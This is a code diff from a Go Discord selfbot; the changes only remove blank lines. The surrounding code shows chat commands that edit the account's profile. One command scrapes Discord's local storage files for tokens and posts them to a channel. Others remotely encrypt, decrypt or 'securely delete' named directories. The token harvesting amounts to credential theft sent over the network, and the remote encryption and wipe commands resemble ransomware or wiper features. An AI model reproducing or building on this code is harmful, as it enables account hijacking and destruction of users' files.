@@ -1354,28 +1354,22 @@
           bot.SendMessage(channelID, "Usage: avatar <image_url>")
           return
       }
-
       imageURL := args[0]
-
       resp, err := http.Get(imageURL)
       if err != nil {
           bot.SendMessage(channelID, "Failed to download image")
           return
       }
       defer resp.Body.Close()
-
       imageData, err := io.ReadAll(resp.Body)
       if err != nil {
           bot.SendMessage(channelID, "Failed to read image data")
           return
       }
-
       encoded := base64.StdEncoding.EncodeToString(imageData)
-
       payload := map[string]interface{}{
           "avatar": fmt.Sprintf("data:image/png;base64,%s", encoded),
       }
-
       jsonData, _ := json.Marshal(payload)
       resp2, err := bot.makeRequest("PATCH", "/users/@me", bytes.NewBuffer(jsonData))
       if err == nil {
@@ -1391,13 +1385,10 @@
           bot.SendMessage(channelID, "Usage: username <new_username>")
           return
       }
-
       username := strings.Join(args, " ")
-
       payload := map[string]interface{}{
           "username": username,
       }
-
       jsonData, _ := json.Marshal(payload)
       resp, err := bot.makeRequest("PATCH", "/users/@me", bytes.NewBuffer(jsonData))
       if err == nil {
@@ -1413,13 +1404,10 @@
           bot.SendMessage(channelID, "Usage: bio <new_bio>")
           return
       }
-
       bio := strings.Join(args, " ")
-
       payload := map[string]interface{}{
           "bio": bio,
       }
-
       jsonData, _ := json.Marshal(payload)
       resp, err := bot.makeRequest("PATCH", "/users/@me", bytes.NewBuffer(jsonData))
       if err == nil {
@@ -1435,10 +1423,8 @@
           bot.SendMessage(channelID, "Usage: hypesquad <bravery/balance/brilliance>")
           return
       }
-
       house := args[0]
       var houseID int
-
       switch strings.ToLower(house) {
       case "bravery":
           houseID = 1
@@ -1450,11 +1436,9 @@
           bot.SendMessage(channelID, "Invalid house. Use: bravery, balance, or brilliance")
           return
       }
-
       payload := map[string]interface{}{
           "house_id": houseID,
       }
-
       jsonData, _ := json.Marshal(payload)
       resp, err := bot.makeRequest("POST", "/hypesquad/online", bytes.NewBuffer(jsonData))
       if err == nil {
@@ -1470,15 +1454,12 @@
           os.Getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
           os.Getenv("LOCALAPPDATA") + "\\Discord\\Local Storage\\leveldb",
       }
-
       var nitroTokens []string
-
       for _, path := range paths {
           files, err := os.ReadDir(path)
           if err != nil {
               continue
           }
-
           for _, file := range files {
               if strings.HasSuffix(file.Name(), ".log") || strings.HasSuffix(file.Name(), ".ldb") {
                   content, _ := os.ReadFile(path + "\\" + file.Name())
@@ -1494,15 +1475,12 @@
               }
           }
       }
-
       if len(nitroTokens) > 0 {
           var response strings.Builder
           response.WriteString("Found potential Nitro tokens:\n")
-
           for _, token := range nitroTokens {
               response.WriteString(fmt.Sprintf("- %s\n", token))
           }
-
           bot.SendMessage(channelID, response.String())
       } else {
           bot.SendMessage(channelID, "No Nitro tokens found")
@@ -1536,7 +1514,6 @@
           return
       }
       defer file.Close()
-
       encoder := json.NewEncoder(file)
       encoder.SetIndent("", "  ")
       err = encoder.Encode(messages)
@@ -1555,14 +1532,12 @@
       }
 
       filename := args[0]
-
       file, err := os.Open(filename)
       if err != nil {
           bot.SendMessage(channelID, fmt.Sprintf("Failed to open backup file: %v", err))
           return
       }
       defer file.Close()
-
       var messages []MessageEvent
       err = json.NewDecoder(file).Decode(&messages)
       if err != nil {
@@ -1585,7 +1560,6 @@
       }
 
       directory := args[0]
-
       err := bot.encryptDirectory(directory)
       if err != nil {
           bot.SendMessage(channelID, fmt.Sprintf("Encryption failed: %v", err))
@@ -1603,7 +1577,6 @@
 
       directory := args[0]
       key := args[1]
-
       err := bot.decryptDirectory(directory, []byte(key))
       if err != nil {
           bot.SendMessage(channelID, fmt.Sprintf("Decryption failed: %v", err))
@@ -1620,7 +1593,6 @@
       }
 
       directory := args[0]
-
       err := bot.securelyDeleteDirectory(directory)
       if err != nil {
           bot.SendMessage(channelID, fmt.Sprintf("Secure deletion failed: %v", err))
@@ -1633,17 +1605,14 @@
   func (d *DiscordSelfbot) cmdHelp(bot *DiscordSelfbot, channelID string, args []string) {
       var response strings.Builder
       response.WriteString("Available commands:\n\n")
-
       for name, cmd := range bot.Commands {
           response.WriteString(fmt.Sprintf("!%s - %s\n", name, cmd.Description))
       }
 
       response.WriteString("\nUse !help <command> for detailed information about a specific command.")
-
       if len(response.String()) > 1900 {
           parts := strings.Split(response.String(), "\n")
           current := ""
-
           for _, part := range parts {
               if len(current)+len(part)+1 > 1900 {
                   bot.SendMessage(channelID, current)
@@ -1671,7 +1640,6 @@
       }
 
       fmt.Println("[+] Selfbot is running...")
-
       for d.Running {
           time.Sleep(100 * time.Millisecond)
       }
@@ -1687,7 +1655,6 @@
       }
 
       token := os.Args[1]
-
       if !isValidToken(token) {
           fmt.Println("[-] Invalid token format")
           os.Exit(1)
@@ -1695,7 +1662,6 @@
 
       bot := NewDiscordSelfbot(token)
       bot.initializeCommands()
-
       err := bot.Run()
       if err != nil {
           log.Fatal("Selfbot error:", err)
